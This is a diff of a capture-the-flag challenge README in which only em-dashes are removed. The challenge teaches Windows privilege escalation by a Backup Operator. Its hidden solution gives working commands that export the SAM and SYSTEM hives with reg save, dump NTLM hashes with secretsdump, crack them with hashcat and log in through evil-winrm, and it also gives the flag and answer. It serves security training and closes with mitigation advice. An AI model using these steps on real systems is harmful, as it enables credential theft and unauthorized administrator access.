@@ -1,18 +1,18 @@
-# Challenge 2 — SAM Database Dump via Backup Operator
+# Challenge 2  SAM Database Dump via Backup Operator
 
 **Difficulty:** Hard
-**Category:** Windows Privilege Escalation — Credential Extraction
+**Category:** Windows Privilege Escalation  Credential Extraction
 **Flag:** `C:\CTF\candie_office\broomhilda.txt`
 
 ---
 
 ## Story
 
-You are **Django**. You've gained a foothold as `django` — a Backup Operator on
+You are **Django**. You've gained a foothold as `django`  a Backup Operator on
 Calvin Candie's Windows machine. Candie is a local Administrator, and only he can
 open the office where Broomhilda is kept.
 
-Backup Operators have a quiet, overlooked power: they can read any file on the system —
+Backup Operators have a quiet, overlooked power: they can read any file on the system 
 including the SAM database where Windows stores password hashes.
 Extract Candie's hash. Crack it. Walk through the front door.
 
@@ -30,7 +30,7 @@ Set-ExecutionPolicy Bypass -Scope Process -Force
 
 3. Log in as `django` / `freedom`
 
-### Tools required (on your attack machine — Kali or Mac)
+### Tools required (on your attack machine  Kali or Mac)
 
 ```bash
 pip install impacket
@@ -45,10 +45,10 @@ Also install: `hashcat` or `john`
 
 The **Backup Operators** group exists to allow users to back up and restore files
 regardless of file permissions. This includes the SAM hive (`C:\Windows\System32\config\SAM`)
-and SYSTEM hive — together they contain all local account NTLM hashes.
+and SYSTEM hive  together they contain all local account NTLM hashes.
 
 Normally these files are locked while Windows is running. But Backup Operators can use
-`reg save` to export them to a readable location — it uses the Backup privilege
+`reg save` to export them to a readable location  it uses the Backup privilege
 (`SeBackupPrivilege`) to bypass the lock and access restrictions.
 
 ---
@@ -98,9 +98,9 @@ hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt
 ## Solution
 
 <details>
-<summary>Click to reveal — try on your own first!</summary>
+<summary>Click to reveal  try on your own first!</summary>
 
-### Step 1 — Confirm Backup Operator membership
+### Step 1  Confirm Backup Operator membership
 
 ```cmd
 whoami /groups | findstr Backup
@@ -112,7 +112,7 @@ BUILTIN\Backup Operators
 SeBackupPrivilege    Back up files and directories    Enabled
 ```
 
-### Step 2 — Export the SAM and SYSTEM hives
+### Step 2  Export the SAM and SYSTEM hives
 
 ```cmd
 reg save HKLM\SAM C:\Users\django\Desktop\SAM
@@ -121,7 +121,7 @@ reg save HKLM\SYSTEM C:\Users\django\Desktop\SYSTEM
 
 Transfer both files to your Kali/Mac attack machine.
 
-### Step 3 — Extract hashes with secretsdump
+### Step 3  Extract hashes with secretsdump
 
 ```bash
 secretsdump.py -sam SAM -system SYSTEM LOCAL
@@ -135,7 +135,7 @@ candie:1001:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
 django:1002:aad3b435b51404eeaad3b435b51404ee:...
 ```
 
-### Step 4 — Crack Candie's hash
+### Step 4  Crack Candie's hash
 
 ```bash
 hashcat -m 1000 <CANDIE_NTLM_HASH> /usr/share/wordlists/rockyou.txt
@@ -143,16 +143,16 @@ hashcat -m 1000 <CANDIE_NTLM_HASH> /usr/share/wordlists/rockyou.txt
 
 Result: `Candie$Plantation1858`
 
-### Step 5 — Authenticate as Candie and read the flag
+### Step 5  Authenticate as Candie and read the flag
 
-Option A — local login on the VM:
+Option A  local login on the VM:
 Log out and log in as `candie` / `Candie$Plantation1858`
 
 ```powershell
 type C:\CTF\candie_office\broomhilda.txt
 ```
 
-Option B — remote with evil-winrm (if WinRM is enabled):
+Option B  remote with evil-winrm (if WinRM is enabled):
 ```bash
 evil-winrm -i <VM_IP> -u candie -p 'Candie$Plantation1858'
 ```
@@ -166,7 +166,7 @@ CTF{s4m_dumped_h4sh_cr4ck3d_dj4ng0}
 The SAM database stores NTLM hashes for all local accounts. While the file is locked
 at runtime, Backup Operators can use `SeBackupPrivilege` to read it via `reg save`.
 This is a documented and common privilege escalation path. Mitigation: audit Backup
-Operators group membership — it should contain only dedicated backup service accounts,
+Operators group membership  it should contain only dedicated backup service accounts,
 never interactive user accounts. Additionally, enable Credential Guard to protect
 credentials in memory from extraction tools.
 
